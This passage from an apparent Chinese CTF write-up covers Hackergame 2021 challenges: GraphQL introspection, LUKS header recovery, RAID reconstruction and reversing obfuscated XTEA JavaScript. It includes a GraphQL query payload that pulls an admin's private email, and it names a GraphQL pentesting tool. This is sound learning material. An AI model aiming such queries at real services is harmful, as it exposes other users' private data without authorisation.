value.\",\"fields\":[{\"name\":\"name\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"description\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"type\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__Type\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"defaultValue\",\"description\":\"A GraphQL-formatted string representing the default value for this input value.\",\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"isDeprecated\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"deprecationReason\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null}],\"inputFields\":null,\"interfaces\":[],\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"OBJECT\",\"name\":\"__EnumValue\",\"description\":\"One possible value for a given Enum. Enum values are unique values, not a placeholder for a string or numeric value. However an Enum value is returned in a JSON response as a string.\",\"fields\":[{\"name\":\"name\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"description\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"isDeprecated\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"deprecationReason\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null}],\"inputFields\":null,\"interfaces\":[],\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"OBJECT\",\"name\":\"__Directive\",\"description\":\"A Directive provides a way to describe alternate runtime execution and type validation behavior in a GraphQL document.\\n\\nIn some cases, you need to provide options to alter GraphQL's execution behavior in ways field arguments will not suffice, such as conditionally including or skipping a field. Directives provide this by describing additional information to the executor.\",\"fields\":[{\"name\":\"name\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"description\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"isRepeatable\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"ofType\":null}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"locations\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"ENUM\",\"name\":\"__DirectiveLocation\",\"ofType\":null}}}},\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"args\",\"description\":null,\"args\":[],\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"LIST\",\"name\":null,\"ofType\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"OBJECT\",\"name\":\"__InputValue\",\"ofType\":null}}}},\"isDeprecated\":false,\"deprecationReason\":null}],\"inputFields\":null,\"interfaces\":[],\"enumValues\":null,\"possibleTypes\":null},{\"kind\":\"ENUM\",\"name\":\"__DirectiveLocation\",\"description\":\"A Directive can be adjacent to many parts of the GraphQL language, a __DirectiveLocation describes one such possible adjacencies.\",\"fields\":null,\"inputFields\":null,\"interfaces\":null,\"enumValues\":[{\"name\":\"QUERY\",\"description\":\"Location adjacent to a query operation.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"MUTATION\",\"description\":\"Location adjacent to a mutation operation.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"SUBSCRIPTION\",\"description\":\"Location adjacent to a subscription operation.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"FIELD\",\"description\":\"Location adjacent to a field.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"FRAGMENT_DEFINITION\",\"description\":\"Location adjacent to a fragment definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"FRAGMENT_SPREAD\",\"description\":\"Location adjacent to a fragment spread.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"INLINE_FRAGMENT\",\"description\":\"Location adjacent to an inline fragment.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"VARIABLE_DEFINITION\",\"description\":\"Location adjacent to a variable definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"SCHEMA\",\"description\":\"Location adjacent to a schema definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"SCALAR\",\"description\":\"Location adjacent to a scalar definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"OBJECT\",\"description\":\"Location adjacent to an object type definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"FIELD_DEFINITION\",\"description\":\"Location adjacent to a field definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"ARGUMENT_DEFINITION\",\"description\":\"Location adjacent to an argument definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"INTERFACE\",\"description\":\"Location adjacent to an interface definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"UNION\",\"description\":\"Location adjacent to a union definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"ENUM\",\"description\":\"Location adjacent to an enum definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"ENUM_VALUE\",\"description\":\"Location adjacent to an enum value definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"INPUT_OBJECT\",\"description\":\"Location adjacent to an input object type definition.\",\"isDeprecated\":false,\"deprecationReason\":null},{\"name\":\"INPUT_FIELD_DEFINITION\",\"description\":\"Location adjacent to an input object field definition.\",\"isDeprecated\":false,\"deprecationReason\":null}],\"possibleTypes\":null}],\"directives\":[{\"name\":\"include\",\"description\":\"Directs the executor to include this field or fragment only when the `if` argument is true.\",\"locations\":[\"FIELD\",\"FRAGMENT_SPREAD\",\"INLINE_FRAGMENT\"],\"args\":[{\"name\":\"if\",\"description\":\"Included when true.\",\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"ofType\":null}},\"defaultValue\":null}]},{\"name\":\"skip\",\"description\":\"Directs the executor to skip this field or fragment when the `if` argument is true.\",\"locations\":[\"FIELD\",\"FRAGMENT_SPREAD\",\"INLINE_FRAGMENT\"],\"args\":[{\"name\":\"if\",\"description\":\"Skipped when true.\",\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"Boolean\",\"ofType\":null}},\"defaultValue\":null}]},{\"name\":\"deprecated\",\"description\":\"Marks an element of a GraphQL schema as no longer supported.\",\"locations\":[\"FIELD_DEFINITION\",\"ARGUMENT_DEFINITION\",\"INPUT_FIELD_DEFINITION\",\"ENUM_VALUE\"],\"args\":[{\"name\":\"reason\",\"description\":\"Explains why this element was deprecated, usually also including a suggestion for how to access supported similar data. Formatted using the Markdown syntax, as specified by [CommonMark](https://commonmark.org/).\",\"type\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null},\"defaultValue\":\"\\\"No longer supported\\\"\"}]},{\"name\":\"specifiedBy\",\"description\":\"Exposes a URL that specifies the behaviour of this scalar.\",\"locations\":[\"SCALAR\"],\"args\":[{\"name\":\"url\",\"description\":\"The URL that specifies the behaviour of this scalar.\",\"type\":{\"kind\":\"NON_NULL\",\"name\":null,\"ofType\":{\"kind\":\"SCALAR\",\"name\":\"String\",\"ofType\":null}},\"defaultValue\":null}]}]}}} 然后可以发现 email 相关的是 privateEmail，查询用户的话用 user，args 里用 id: 1 来查 admin 的信息。 payload: {\"query\":\"{ user(id: 1) { id\\nprivateEmail }}\"} 打过去就能拿到 flag 啦！ Extensive Reading: 30分钟理解GraphQL核心概念 Hack In Paris 2019 CTF – “Meet Your Doctor” (GraphQL challenge) GraphQL injection 一个工具 GraphQLmap - a scripting engine to interact with a graphql endpoint for pentesting purposes. 加密的 U 盘 这是一个关于 LUKS (Linux Unified Key Setup) 的故事。 第一天 小 T：「你要的随机过程的课件我帮你拷好了，在这个 U 盘里，LUKS 加密的密码是 suijiguocheng123123。」 小 Z：「啊，你又搞了 Linux 文件系统加密，真拿你没办法。我现在不方便用 Linux，我直接把这块盘做成磁盘镜像文件再回去处理吧。」 第二天 小 Z：「谢谢你昨天帮我拷的课件。你每次都搞这个加密，它真的安全吗？」 小 T：「当然了！你看，你还给我之后，我已经把这块盘的弱密码改掉了，现在是随机生成的强密码，这样除了我自己，世界上任何人都无法解密它了。」 小 Z：「我可不信。」 小 T：「你不信？你看，我现在往 U 盘里放一个 flag 文件，然后这个 U 盘就给你了，你绝对解密不出来这个文件的内容。当初搞 LUKS 的时候我可研究了好几天，班上可没人比我更懂加密！」 放进 winhex 里可以发现这俩文件都是完整的磁盘镜像，包含 EFI 之类的引导扇区，而后包含了 LUKS 加密分区。 参考 扫盲 dm-crypt — — 多功能 Linux 磁盘加密工具（兼容 TrueCrypt &amp; VeraCrypt） 去年 hackergame 室友的加密硬盘 一题 （那个是提取 AESKEY，不大一样 先把我们需要的这两个文件的 LUKS 分区给导出来，分别为 1.001, 2.001. 或者用 parted 获取 offset，然后挂载 loop。 发现二者的 UUID 相同。 然后用 cryptsetup 挂载，看看情况。day1 的密钥就是题目给的 suijiguocheng123123。 # cryptsetup luksOpen 1.001 day1 # cryptsetup status day1 /dev/mapper/day1 is active. type: LUKS2 cipher: aes-xts-plain64 keysize: 512 bits key location: keyring device: /dev/loop0 loop: /mnt/hgfs/games/Hackergame2021USTC/lukspwd/1.001 sector size: 512 offset: 32768 sectors size: 6111 sectors mode: readonly # mkdir /mnt/day1 # mount /dev/mapper/day1 /mnt/day1 mount: /mnt/day1: WARNING: source write-protected, mounted read-only. # df -hT 文件系统 类型 容量 已用 可用 已用% 挂载点 udev devtmpfs 1.4G 0 1.4G 0% /dev tmpfs tmpfs 293M 1.9M 291M 1% /run /dev/sda1 ext4 39G 23G 14G 62% / tmpfs tmpfs 1.5G 0 1.5G 0% /dev/shm tmpfs tmpfs 5.0M 0 5.0M 0% /run/lock vmhgfs-fuse fuse.vmhgfs-fuse 256G 245G 12G 96% /mnt/hgfs tmpfs tmpfs 293M 64K 293M 1% /run/user/0 /dev/mapper/day1 ext4 2.0M 33K 1.7M 2% /mnt/day1 # cd /mnt/day1/ # ll 总用量 31K -rw-r--r-- 1 root root 19K 10月 18 23:52 随机过程.txt drwx------ 2 root root 12K 10月 18 23:52 lost+found 看一下两个盘里的 Key Slot # cryptsetup luksDump 1.001 LUKS header information Version: 2 Epoch: 3 Metadata area: 16384 [bytes] Keyslots area: 16744448 [bytes] UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998 Label: (no label) Subsystem: (no subsystem) Flags: (no flags) Data segments: 0: crypt offset: 16777216 [bytes] length: (whole device) cipher: aes-xts-plain64 sector: 512 [bytes] Keyslots: 0: luks2 Key: 512 bits Priority: normal Cipher: aes-xts-plain64 Cipher key: 512 bits PBKDF: pbkdf2 Hash: sha256 Iterations: 1581562 Salt: b6 95 26 1a d3 8d bb 51 fb 78 c2 1b 87 6b 9f 5a 66 10 4c 01 8f ae eb 30 53 c4 93 03 fd 1a 68 d6 AF stripes: 4000 AF hash: sha256 Area offset:32768 [bytes] Area length:258048 [bytes] Digest ID: 0 Tokens: Digests: 0: pbkdf2 Hash: sha256 Iterations: 104857 Salt: 3c f9 97 83 b9 08 0e b0 c8 ee b5 cc 63 f1 79 1f 1f df a5 11 cc 6e 48 53 b9 04 24 36 a4 4b 8d 55 Digest: 67 59 6a 45 a1 a1 6a 8e 09 75 71 5c b6 3c 83 9f 6c 00 ad d0 a4 df fe 9a 13 01 70 f8 de 03 a2 2b # cryptsetup luksDump 2.001 LUKS header information Version: 2 Epoch: 5 Metadata area: 16384 [bytes] Keyslots area: 16744448 [bytes] UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998 Label: (no label) Subsystem: (no subsystem) Flags: (no flags) Data segments: 0: crypt offset: 16777216 [bytes] length: (whole device) cipher: aes-xts-plain64 sector: 512 [bytes] Keyslots: 1: luks2 Key: 512 bits Priority: normal Cipher: aes-xts-plain64 Cipher key: 512 bits PBKDF: pbkdf2 Hash: sha256 Iterations: 1615678 Salt: d7 da 36 0c 04 52 0d 52 7a cc 3b 6a 33 14 5c d9 ed ff 5d ec 74 d0 13 06 1d 0a c2 60 c5 de 08 3f AF stripes: 4000 AF hash: sha256 Area offset:290816 [bytes] Area length:258048 [bytes] Digest ID: 0 Tokens: Digests: 0: pbkdf2 Hash: sha256 Iterations: 104857 Salt: 3c f9 97 83 b9 08 0e b0 c8 ee b5 cc 63 f1 79 1f 1f df a5 11 cc 6e 48 53 b9 04 24 36 a4 4b 8d 55 Digest: 67 59 6a 45 a1 a1 6a 8e 09 75 71 5c b6 3c 83 9f 6c 00 ad d0 a4 df fe 9a 13 01 70 f8 de 03 a2 2b 可以发现他们 header 是相同的。 参考 How to recover lost LUKS key or passphrase 磁盘加密用户使用指南 cryptsetup - Backup and Data Recovery 于是先导出 day1 的 header backup file，然后用它来给 day2 恢复，再用 day1 的密钥就能解开加密分区了。 cryptsetup luksHeaderBackup --header-backup-file header 1.001 cryptsetup --header header luksOpen 2.001 day2 flag{changing_Pa55w0rD_d0esNot_ChangE_Luk5_ma5ter_key} 果然是没改 master key（23333 最后再卸载文件系统，关闭加密盘. umount /mnt/day1 umount /mnt/day2 cryptsetup close day1 cryptsetup close day1 赛博厨房 虽然这是你的餐厅，但只有机器人可以在厨房工作。机器人精确地按照程序工作，在厨房中移动，从物品源取出食材，按照菜谱的顺序把食材依次放入锅内。 机器人不需要休息，只需要一个晚上的时间来学习你教给它的程序，在此之后你就可以在任何时候让机器人执行这个程序，程序的每一步执行都会被记录下来，方便你检查机器人做菜的过程。 另外为了符合食品安全法的要求，赛博厨房中的机器人同一时间手里只能拿一种食物，每次做菜前都必须执行清理厨房的操作，把各处的食物残渣清理掉，然后回到厨房角落待命。 每天的菜谱可能不同，但也许也存在一些规律。 对机器人编程可以使用的指令有（n, m 为整数参数，程序的行号从 0 开始，注意指令中需要正确使用空格）： 向上 n 步 向下 n 步 向左 n 步 向右 n 步 放下 n 个物品 拿起 n 个物品 放下盘子 拿起盘子 如果手上的物品大于等于 n 向上跳转 m 行 如果手上的物品大于等于 n 向下跳转 m 行 赶紧进入赛博厨房开始做菜吧！ 进入 Level 0 进入 Level 1 进入 Level 2 进入 Level 3 Level 0向右 1 步 拿起 1 个物品 向下 1 步 向左 2 步 放下 1 个物品 向右 1 步 向上 1 步 拿起 1 个物品 向下 1 步 向左 1 步 放下 1 个物品 Level 1今日菜谱物品 ID：0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 73 个 0 草，才发现它的 向上跳转 2 行 是说从程序执行的上面两行再继续往下执行。。而且在边界上不会再次移动了。那就简单了呀。 向右 1 步 拿起 75 个物品 向下 1 步 向左 1 步 放下 1 个物品 如果手上的物品大于等于 3 向上跳转 1 行 放下盘子 阵列恢复大师 2021 年 10 月 3 日，阴转小雨。 你发现你运行在实验室机器上的炼丹脚本挂了。 「好好的国庆假期，怎么我还得来改程序……」收到邮件通知后，你登录了机器，看到的却是一大堆 Input/Output Error，回过神来才发现，放数据的阵列好像出了问题。 「完了！上面的数据我从来没有备份过！这下赶不上 DDL 发不了 paper 了！」你赶忙跑到机房，检查了一下阵列的情况——看起来盘没坏，都能读，只是可能是受到神秘宇宙射线（误）的影响，阵列的管理页面看不了，每块盘的 RAID 元数据好像也全不见了，更要命的是，你忘了当初组阵列时候盘的顺序和其他的参数。怎么恢复数据呢？上网搜索一下，好像得花不少钱。但你听说你的同学最近在搞信息什么大赛——或许可以让他们试试？ 以下是两个压缩包，分别是一个 RAID 0 阵列的磁盘压缩包，和一个 RAID 5 阵列的磁盘压缩包，对应本题的两小问。你需要解析得到正确完整的磁盘阵列，挂载第一个分区后在该分区根目录下使用 Python 3.7 或以上版本执行 getflag.py 脚本以获取 flag。磁盘数据保证无损坏。 RAID 0 阵列压缩包，SHA256: f73bee3a2dce201566573f51bd28026c467182601eb6e55130db10c7c0c8127f RAID 5 阵列压缩包，SHA256: 5eb1d2042ab5f8e2ee1508bf5e66632b4c307a595099e499aa9bc2a7255a6009 RAID 5 RAID级别 该程序支持使用操作系统或主板以及使用各种制造商的控制器和外部存储设备创建的磁盘阵列 硬盘阵列： JBOD是磁盘的顺序合并。用信息填充磁盘后，数据将写入下一个数据。用于增加空间。至少需要2个（两个）磁盘。 RAID 0 是向所有磁盘写入块的顺序替换。用于增加空间并加快数据访问。最少2（两）个磁盘。 RAID 1这是阵列中所有磁盘上的数据重复。用于保护数据以防丢失。至少2（两）个磁盘。 RAID 10 (1 + 0).至少4（四）个磁盘。 RAID 1E (1 + 0 包括改进).至少3（三）个磁盘。 RAID 5 是将数据与校验和的保留进行交织。 2个（两个）磁盘发生故障后可以自行恢复。加快磁盘工作，扩展空间并保护数据不丢失。至少三（3）个磁盘。 RAID 50 (5 + 0).至少6（六）个磁盘。 RAID 5E 和 5EE （类似于级别5，在“热插拔”的情况下有一个额外的磁盘）。级别5EE与5E的不同之处在于，热插拔驱动器不是空闲的，而是与其余驱动器一起使用。 至少4（四）个磁盘。 RAID 6 是使用两个校验和的数据交织。使用里德（Reed）所罗门编码。系统可以从两个磁盘故障中自我恢复。与第五级相比，第六级用于增加磁盘空间，读取和写入速度并提高可靠性 最少4（四）个磁盘。 RAID 60 (6 + 0).最少8（八）个磁盘。 RAID 2 –结合了两组磁盘：带有数据和带有纠错代码。基于汉明码，与大量光盘有关。 最少3（三）个磁盘。 RAID 3 与第五级类似，但是校验和不是在所有磁盘之间交错，而是始终写入其中一个磁盘。这会大大增加带有校验和的磁盘磨损。该级别使用1（一个）字节大小的块。 RAID 4 此级别是从RAID 3继承的，区别在于块大小可以大于1（一个）字节。 搜了一下，用 Hetman RAID Recovery™ 这玩意可以恢复（ 好像 EasyRecovery 也行，不过咱没试。 但感觉这个软件中文界面有点锅，会出现 Zenithal Z佬式问号（� EXT4 格式 还有 Windows 上用感觉有点问题，直接导出 zip 会卡住，喵喵是先导出整个镜像 dsk 文件，然后在 DiskGenius 里再把 /files/ 目录下文件恢复出来的。 getflag.py #!/usr/bin/env python3 # Flag is here. # Don't peek in my file, as they are my privacy. # Just execute me to get flag please! import hashlib import os import sys ans = \"\" paths = [] if __name__ == '__main__': path = os.environ.get(\"FILES\", \"./files/\") if not os.path.exists(path): print(\"files folder not found: set FILES environment variable if you are not in the root of my disk image.\") sys.exit(-1) for root, dirs, files in os.walk(path): for filename in files: if filename == '.DS_Store': continue filepath = os.path.join(root, filename) paths.append(filepath) paths.sort() for filepath in paths: h = hashlib.sha256() with open(filepath, 'rb') as f: while True: chunk = f.read(h.block_size) if not chunk: break h.update(chunk) hexdigest = h.hexdigest() print(filepath, hexdigest) ans += hexdigest check = hashlib.sha256(ans.encode(\"utf-8\")).hexdigest() if check == \"df81eca70a025e5f2b5d3ba56ac1289b2112a1c041cbe1b199ac5a8049fbf9d7\": print(\"Flag:\", f\"flag{{{hashlib.md5(ans.encode('utf-8')).hexdigest()}}}\") else: print(\"Did you recover my data correctly?\") 发现得在 Linux 下跑，Windows 下不成功，会问你 Did you recover my data correctly? flag{a18325a1ec0f58292908455c2df8ffcd} 赛后听说直接 DiskGenius 组建虚拟 raid，排一下顺序就能解，摸了。 RAID 0同理，但这个自动搜索起来巨慢……跑了二十几分钟，发现了507个配置。 XFS 草，不懂为啥这个文件系统不管是否恢复被删除的文件出来，最后算出来的结果都不对，不懂哪里锅了，佛了…… 哪位师傅能提供个正确恢复出来的文件给喵喵 diff 一下呢（ 噢对，讲个故事，这个镜像排好的顺序忘记记录下来了，惨惨，啥时候换种方式重新拼吧。 minecRaft kk 同学很喜欢玩 Minecraft，他最近收到了一张 MC 地图，地图里面有三盏灯，还有很多奇奇怪怪的压力板。 但他发现这些灯好像不太符合 MC 电磁学（Red stone），你能帮他把灯全部点亮吗？ 注：本题解法与原版 Minecraft 游戏无关。 http://202.38.93.111:12899/ 补充说明：flag 花括号内为让三盏灯全部点亮的最短的输入序列。例如，如果踩踏压力板输入的最短的序列为 abc，则答案为 flag{abc}。 这个 MC 可不简单…… 看上去是个游戏，实际上是个逆向题。 首先这题里面有个用来反爬虫的定时器 debugger 卡死浏览器调试窗口，可以抓包，改返回包把这部分去掉。 入口在这里，输入的字符长度为32，会调用 flag.js 里的 gyflagh 函数进行校验，如果返回 true 则结果正确。 然而，flag.js 里函数进行了混淆，可恶啊！！！ 进行了好一番静态+动态调试，大概的逻辑是下面这样。 前面有个匿名函数，给 Strings 类定义了一个 encrypt 方法。 gyflagh 的参数就是我们的输入，经过 encrypt 后与 6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c 做对比，相同则正确。 而 encrypt 里依次取出 flag 的前四位、后四位，转换为 long 类型，进行 code。 再看 code，实际上它进行了 32 轮变化，这个 2654435769 其实就是熟悉的 0x9e3779b9，即 Tiny Encryption Algorithm (TEA) 算法常量。这里其实用到的是 XTEA 加密算法。 String['prototype'][\"encrypt\"] = function (param) { // param = \"1356853149054377\" x1 = new Array(2), x2 = new Array(4); let result = ''; plaintext = escape(this); //flag for (var i = 0; i &lt; 4; i++) x2[i] = Str4ToLong(\"1356853149054377\" [\"slice\"](i * 4, (i + 1) * 4)); // x2 = [ 909456177, 825439544, 892352820, 926364468 ] for (i = 0; i &lt; 32; i += 8) { //plaintext[\"length\"] x1[0] = Str4ToLong(plaintext['slice'](i, i + 4)), //前4位 x1[1] = Str4ToLong(plaintext[\"slice\"](i + 4, i + 8)), //后4位 //console.log('x1:', x1, 'x2:', x2); code(x1, x2), //console.log('===code===&gt; x1:', x1, 'x2:', x2); let tmp = LongToBase16(x1[0]) + LongToBase16(x1[1]); console.log(tmp); result += tmp; // LongToBase16 8位 e.g. \"00000926\" } return result; // \"6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c\" length=64 } function gyflagh(_0x111955) { // const _0x50051f = _0x22517d; let _0x3b790d = _0x111955[\"encrypt\"](\"1356853149054377\"); if (_0x3b790d === \"6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c\") return true; return false; } function code(x1, x2) { // x2 = [ 909456177, 825439544, 892352820, 926364468 ] let y1 = x1[0], y2 = x1[1]; let i = 0; while (i != 84941944608) { // 32轮 y1 += (y2 &lt;&lt; 4 ^ y2 &gt;&gt;&gt; 5) + y2 ^ i + x2[i &amp; 3], i += 2654435769, y2 += (y1 &lt;&lt; 4 ^ y1 &gt;&gt;&gt; 5) + y1 ^ i + x2[i &gt;&gt;&gt; 11 &amp; 3]; } x1[0] = y1, x1[1] = y2; } 于是解密就反过来写就完事了。 Exp: function decrypt(v) { let key = [909456177, 825439544, 892352820, 926364468]; let i; let v0 = v[0], v1 = v[1], delta = 0x9E3779B9, sum = delta * 32; for (i = 0; i &lt; 32; i++) { v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt;&gt; 5)) + v0) ^ (sum + key[(sum &gt;&gt;&gt; 11) &amp; 3]); sum -= delta; v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt;&gt; 5)) + v1) ^ (sum + key[sum &amp; 3]); } v[0] = v0; v[1] = v1; return v; } var cipher = \"6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c\"; var x1_list = []; for (let i = 0; i &lt; 64; i += 8) { console.log(cipher[\"slice\"](i, (i + 8))); let tmp = Base16ToLong(cipher[\"slice\"](i, (i + 8))); console.log(tmp); x1_list.push(tmp); } var result = ''; for (let i = 0; i &lt; 8; i += 2) { let xx = [x1_list[i], x1_list[i + 1]]; decrypt(xx); r0 = LongToStr4(xx[0]); console.log(r0); r1 = LongToStr4(xx[1]); console.log(r1); result += r0 + r1; } console.log(result); // \"McWebRE_inMlnCrA1t_3a5y_1cIuop9i\" flag{McWebRE_inMlnCrA1t_3a5y_1cIuop9i} 这题耗费了喵喵好几天时间，刚开始在想为啥 Base16ToLong 和 LongToBase16 结果不一样，后者只取了8位的 hex，导致转换回去不对。 但最后发现其实不是上面那个问题，是 XTEA 解密函数写错了，发现又没考虑 有符号数与无符号数的问题，也就是 &gt;&gt; 和 &gt;&gt;&gt; 。。。 喵喵是 fw（ Unsigned right shift (&gt;&gt;&gt;) The unsigned right shift operator (&gt;&gt;&gt;) (zero-fill right shift) shifts the first operand the specified number of bits to the right. Excess bits shifted off to the right are discarded. Zero bits are shifted in from the left. The sign bit becomes 0, so the result is always non-negative. Unlike the other bitwise operators, zero-fill right shift returns an unsigned 32-bit integer. via https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Unsigned_right_shift TEA、XTEA、XXTEA加密解密算法 Python实现TEA、XTEA、XXTEA加密解密算法 卷王与野生的 GPA “24 岁，是卷王。” 即便一早学会了养生、收获了强者的发型，24 岁的科大卷王仍然无法超脱开“电子鸦片”的荼毒。 最近，他喜欢玩一款经典的掌机。这台掌机推出于 2001 年，曾经风靡全球，销量累计 8100 万台。 令卷王非常快乐的是，这台掌机使用了 ARM 指令集，正好就是上个学期在《微机原理与嵌入式系统》中学习的内容。 就算是沉迷“电子鸦片”，卷王也不忘记要在轻松娱乐的时光中获取 GPA。 这天，卷王得到了一张破旧的游戏卡带。（顺带地，他还得到了卡带烧录之前编译的 ELF 文件） 当年在这台游戏机上，少年们夜以继日捕捉着传说中的精灵； 而就在卷王冒险的过程中、野生的 GPA 跳了出来！ 手上没有任何装备的卷王卷不起来，不愿躺平的他在惊慌之中输入了经典的作弊码。 就在他向野生的 GPA 扔出球时，他发现，要抓住野生的 GPA，远没有那么简单…… 经典 .gba，是任天堂游戏机啊！ 参考 小破站的视频 GBA游戏用什么姿势玩？GBA最佳运行方案集结！ 我们可以买个实体机然后刷进去玩（雾 当然，喵喵懒了，用 Visual Boy Advance（VBA）模拟器来玩吧（ VisualBoyAdvance（以下简称“VBA”）是一个根据GNU General Public License发布的免费软件。它能够在电脑上模拟任天堂所发行的手提游戏机，包括：Game Boy、Super Game Boy、Game Boy Color和Game Boy Advance。由于VBA模拟效果与真正的GBA基本无异，直至2006年是Win32电脑上最受欢迎的模拟器。VBA和gnuboy是广泛分布的Game Boy模拟器，且VBA已有中文化版本。 VisualBoyAdvance-M（或简作VBA-M）是一个改良分支，来自不活跃的VisualBoyAdvance项目。VisualBoyAdvance-M中的“M”据信是“Merge（合并）”的缩写。另外的独立版本称为VBA-ReRecording，它提供了工具辅助回放功能。 via https://zh.wikipedia.org/wiki/Visual_Boy_Advance 可以到 SourceForge 或者 emulator-zone 下载 VBA 或者 VBA-M。 或者 VBA-M 官网 也行，里面还提供了语言包 Language Files。 打开 .gba （TODO ​ 马赛克 共享单车只剩下一辆，走近一看，果然是一辆二维码被坏人涂掉一大块的车，谁也骑不走。 我今天还非就要把这个辆车骑走。 于是你开始研究起来这个二维码。 点击下面按钮下载源代码与图片 https://hack.lug.ustc.edu.cn/media/07ef998b-ea49-51a7-b8ed-8ab733ba0273/mosaic.zip 查到了这个：黑客将打了马赛克的二维码还原，并成功窃取资金 经典社工啊（ 其实就是根据周围的像素点来推断边缘处的像素，然后逐渐缩小边界，最后即使不能完全修复，但凭借二维码的冗余特性，还是能识别出来的。 （TODO Micro World 宇宙中某一片极其微小的区域里的粒子被一股神秘力量初始化设置成了 flag 的形状，程序忠实地记录了一段时间之后这片区域的粒子运动情况。 https://hack.lug.ustc.edu.cn/media/6f3f9a71-a6a3-5393-ab90-57080553a279/microworld.exe 又是 pyinstaller 打包的，python38，没有加密，很舒服。 可以看看咱写的 2021 网信柏鹭杯 Reverse baby_python 一题 Writeup python3 pyinstxtractor.py microworld.exe 根据 struct.pyc 把 2.pyc 文件头改一下 uncompyle6 2.pyc &gt; 2.py 根据提示，初始化设置成了 flag 的形状，一段时间之后这片区域的粒子运动情况，说明这个数据是进行了一段时间的运动后的，要恢复回去。 当前的状态如下（没啥用看起来 然而发现反编译之后跑这个 2.py，只剩一个点在动了，好奇怪啊…… 